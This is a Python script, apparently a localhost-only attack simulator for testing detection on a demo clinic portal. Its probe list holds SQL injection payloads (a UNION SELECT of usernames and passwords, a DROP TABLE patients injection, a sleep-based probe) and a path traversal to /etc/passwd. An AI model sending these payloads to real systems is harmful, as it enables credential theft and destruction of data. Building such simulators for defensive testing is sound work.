"""Web Application Attack / SQLi Simulator [SIMULATION].

Sends SQL injection and path traversal patterns to the clinic portal.

Safety: Strictly localhost only. Capped at 30 requests.
"""

import argparse
import sys
import time
import urllib.parse
import httpx

MAX_REQUESTS = 30

SQLI_PROBES = [
    "/records/1%27%20OR%201=1--",
    "/records/100?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
    "/records/1?filter=test;%20DROP%20TABLE%20patients--",
    "/records/search?q=test%27%20AND%20sleep(5)--",
    "/records/../../../../etc/passwd",
]


def verify_target(url: str) -> None:
    parsed = urllib.parse.urlparse(url)
    hostname = (parsed.hostname or "").lower()
    if hostname not in ("localhost", "127.0.0.1"):
        print(f"[SIMULATION] ERROR: Target {url} is forbidden. Refusing non-localhost.")
        sys.exit(1)


def run_websqli(target_url: str = "http://localhost:8002", retry_after: int = 0) -> None:
    verify_target(target_url)
    print("\n" + "=" * 60)
    print(" [SIMULATION] Starting Web Application SQLi Probing")
    print(f" Target Site: {target_url}")
    print(" Source IP:   203.0.113.195 (Simulated)")
    print(" Safety:      Localhost only, request-capped.")
    print("=" * 60 + "\n")

    headers = {"X-Demo-Source-IP": "203.0.113.195"}
    requests_sent = 0

    with httpx.Client(base_url=target_url, timeout=5.0) as client:
        for i, probe in enumerate(SQLI_PROBES, 1):
            if requests_sent >= MAX_REQUESTS:
                break
            resp = client.get(probe, headers=headers)
            requests_sent += 1
            print(f"  [Probe {i}/{len(SQLI_PROBES)}] GET {probe[:50]}... -> Status {resp.status_code}")
            time.sleep(0.1)

        print("\n[SIMULATION] Web probing completed.")

        if retry_after > 0:
            print(f"\n[SIMULATION] Waiting {retry_after}s for isolation check...")
            time.sleep(retry_after)
            resp = client.get("/records/1", headers=headers)
            print(f"  [Post-Response Probe] Status {resp.status_code}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Web SQLi Simulator [SIMULATION]")
    parser.add_argument("--url", default="http://localhost:8002")
    parser.add_argument("--retry-after", type=int, default=0)
    args = parser.parse_args()
    run_websqli(args.url, args.retry_after)

